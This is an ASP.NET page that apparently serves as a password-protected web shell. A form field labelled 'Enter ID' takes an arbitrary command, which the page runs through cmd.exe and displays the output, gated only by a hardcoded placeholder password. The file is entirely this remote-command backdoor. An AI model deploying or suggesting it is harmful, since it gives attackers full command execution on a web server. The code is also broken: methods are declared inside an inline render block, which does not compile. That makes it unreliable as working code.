<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="ExecuteCommand.aspx.cs" Inherits="ExecuteCommand.ExecuteCommand" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Execute Command</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <h2>Execute Command</h2>
            <hr />
            <asp:Label ID="lblId" runat="server" Text="Enter ID:"></asp:Label>
            <asp:TextBox ID="txtId" runat="server"></asp:TextBox>
            <br />
            <asp:Label ID="lblPassword" runat="server" Text="Enter Password:"></asp:Label>
            <asp:TextBox ID="txtPassword" runat="server" TextMode="Password"></asp:TextBox>
            <br />
            <asp:Button ID="btnExecute" runat="server" Text="Execute Command" OnClick="btnExecute_Click" />
            <br />
            <asp:Label ID="lblResult" runat="server" Text=""></asp:Label>
        </div>
    </form>

    <%
        // Code-behind logic begins here
        protected void btnExecute_Click(object sender, EventArgs e)
        {
            string id = txtId.Text.Trim();
            string password = txtPassword.Text.Trim();

            // Predefined password to check against
            string predefinedPassword = "your_predefined_password_here";

            if (password == predefinedPassword)
            {
                // Execute command (example: dir command to list files, replace with your command)
                string command = id; // Assuming id is the command to execute
                string result = ExecuteSystemCommand(command);

                // Display result in the label or textbox
                lblResult.Text = result;
            }
            else
            {
                lblResult.Text = "Incorrect password.";
            }
        }

        // Method to execute system command and return output
        private string ExecuteSystemCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    if (process != null)
                    {
                        process.StandardInput.WriteLine(command);
                        process.StandardInput.Flush();
                        process.StandardInput.Close();
                        return process.StandardOutput.ReadToEnd();
                    }
                    else
                    {
                        return "Error executing command.";
                    }
                }
            }
            catch (Exception ex)
            {
                return $"Exception: {ex.Message}";
            }
        }
    %>
</body>
</html>
